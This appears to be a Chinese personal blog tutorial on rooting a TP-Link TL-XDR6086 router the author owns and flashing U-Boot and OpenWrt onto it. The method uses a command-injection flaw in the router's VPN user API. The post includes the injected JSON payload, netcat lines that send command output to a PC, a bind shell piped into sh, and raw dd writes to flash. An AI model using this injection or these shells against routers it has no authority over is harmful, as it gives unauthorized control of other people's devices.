---
title: 'TP-Link TL-XDR6086 刷机原理和教程'
description: '利用 L2TP 服务器删除时的 shell 注入漏洞刷 OpenWrt'
pubDate: 'Aug 29 2024'
heroImage: 'https://imagedelivery.net/6gszw1iux5BH0bnwjXECTQ/727ee92c-717e-4d32-b8f2-98b9865c8300/small'
---

为了满足：

1. 可以刷 OpenWrt
2. 内置天线，体积较小
3. 有 2.5 网口
4. CPU 够用

的需求，从 OpenWrt 支持设备列表中找到了 TP-Link TL-XDR6086，搞了一个，开始折腾。

恩山论坛上有挺多刷机教程，不过我最开始直接照着做发现基本上都不行，于是研究了一下原理，自己折腾。

基本上是抄的 [OpenWrt 教程](https://openwrt.org/toh/tp-link/xdr-6086)

## 常识科普

通常来说，路由器是不能刷机的。路由器的刷机类似于手机的 Root，都是利用系统漏洞获得本不应该获得的权限。

如果你按照这篇文章的方法一比一照做刷成砖了，和我没有半毛钱关系。 It works on my machine. （你猜为什么我博客没有留评论区。）

很多路由器厂商 ~甚至是 nas 厂商~ 的系统都是基于 OpenWrt 的，其中也包括 TP-Link 和小米，这也是为什么我们能知道什么命令在里面可以运行。

你**应该**在 [OpenWrt Wiki](https://openwrt.org/toh/tp-link/xdr-6086) 查找设备信息，**而不是**在百度、CSDN、恩山论坛或者什么其他地方。

你可以从 [OpenWrt 预编译的包](https://downloads.openwrt.org/releases/21.02-SNAPSHOT/packages/aarch64_cortex-a53/packages/) 中下载软件包，而不必在论坛或者 CSDN 里面找别人分享的傻逼百度盘链接。

刷机过程假设你用的是 Linux（或者 Mac），如果你用的是 Windows，爬。

## 漏洞原理

调用`http://192.168.1.1/stok=${STOK}/ds`的 API 创建 VPN 时，有一个地方可以注入 Shell 命令。

> 在进入管理页面之后，F12 查看 API 调用，从 url 里面截取出`${STOk}`

```json
{
    "vpn":{
        "table":"user",
        "para":{
            "username":"; 在这里注入命令&",
            "password":"password1",
            "type":"l2tp",
            "netmode":"client2lan",
            "localip":"192.168.2.1",
            "dns":"1.1.1.1",
            "block":"0",
            "ippool":"new",
            "maxsessions":"1"
        },
        "name":"user_1"
    },
    "method":"add"
}
```

> 举个例子，如果你想要注入`echo 'fuck you'`，`username`就是`;echo 'fuck you'&`

此时，命令录入了路由器的数据库，**当删除这个 VPN 用户时，命令执行**。

## 刷机过程

用 u 盘刷机方案。我不知道为什么简中社区流传很广的方案是用 tftp 去开 server 然后让路由器通过 tftp 去拉取。为此，Windows 用户甚至需要装一个 WSL，这实在是太傻逼了。

首先，[下载`netcat`](https://downloads.openwrt.org/releases/21.02-SNAPSHOT/packages/aarch64_cortex-a53/packages/)，然后放到 FAT32 文件系统的 u 盘里面。最好重命名成 netcat.ipk，方便输入命令。

### 挂载 u 盘和 shell 反射

首先，注入，创建文件夹

```sh
mkdir /tmp/usb
```

然后，在电脑那里，创建 netcat 监听

```sh
nc -l -p 4444
```

> netcat 是一个网络调试工具，也经常被用来做 shell 反射。
> 
> 在电脑上创建 netcat 监听，然后让路由器通过`nc`命令，向电脑的 netcat 发送命令输出，就能看到 webshell 命令执行的结果了。
>
> 如果路由器安装好了 netcat，也可以反过来，让路由器的 netcat 监听电脑的输入。通过`netcat`命令，将电脑发出的 shell 命令传递到`sh`，并将结果通过`nc`命令发送到电脑，实现 shell 反射。

之后，就能得到 shell 的输出了，例如注入这个可以显示有没有成功创建文件夹。其中`192.168.1.100`应该是你的电脑的 ip 地址。

```sh
ls -la /tmp | nc 192.168.1.100 4444
```

如果成功创建文件夹，则注入以下命令挂载 U 盘。注意，如果你拔出过 u 盘然后再插入，会变成`sda2`,`sda3`每次递增，重启后恢复`sda1`。

```sh
mount -t vfat /dev/sda1 /tmp/usb
```

> 如果你不知道 u 盘究竟是什么设备名，可以注入`ls /dev | nc 192.168.1.100 4444`看看

然后，注入这个命令查看是否挂载成功。

```sh
ls -la /tmp/usb | nc 192.168.1.100 4444
```

如果挂载成功，就安装

```sh
opkg install /tmp/usb/netcat.ipk
```

完成安装 netcat 之后，就可以通过 `netcat` 创建反向 shell 了，可以通过电脑的`nc`直接传输命令，不需要注入。

```sh
netcat -lp 4444 | sh
```

### 备份

在路由器端执行

```sh
dd if=/dev/mtdblock9 of=/tmp/usb/backup.img bs=131072
```

### 刷入 U-Boot

**危险操作，请务必确定意识清醒！**

根据 [GitHub 上的讨论](https://github.com/hanwckf/immortalwrt-mt798x/issues/207)，u-boot 可以通过 [bl-mt98x 源码](https://github.com/hanwckf/bl-mt798x) 编译或者下载别人编译好的。

**依次**在路由器上执行以下两个命令，务必确保第一个成功之后再执行第二个。文件名可能有出入，但一定是先 bl2 再 fip.

```sh
dd bs=131072 conv=sync of=/dev/mtdblock9 if=/tmp/usb/xdr608x-bl2.bin
dd bs=131072 conv=sync of=/dev/mtdblock9 seek=28 if=/tmp/usb/xdr608x-fip.bin
```

> 提示：可以通过重定向配合管道运算符输出错误（`2>&1 |`）

设置电脑 ip 地址为静态的 192.168.1.100/24，网关为 198.168.1.1

断电路由器，然后通电，如果正常，则红灯闪烁，进去<http://192.168.1.1>可以看到 u-boot 界面。

![u-boot 界面](https://imagedelivery.net/6gszw1iux5BH0bnwjXECTQ/5d6eb200-ac42-4b02-c09b-f689ec194d00/public)

### 安装 OpenWrt

目前 OpenWrt 对 XDR-6086 的支持很差，我在恩山论坛上找到了一个`ImmortalWrt 21.02-SNAPSHOT r0-e1b4487`的 6086 固件才成功安装上。

暂不明确能否二次刷机成自己编译的 OpenWrt，但通过 U-Boot 直接刷入自行编译的 ImmortalWrt 并不能启动。

需要注意的是，XDR-6086 的 CPU 性能似乎不够，在 OpenClash 和 SSR Plus 上都只能跑到 300Mbps.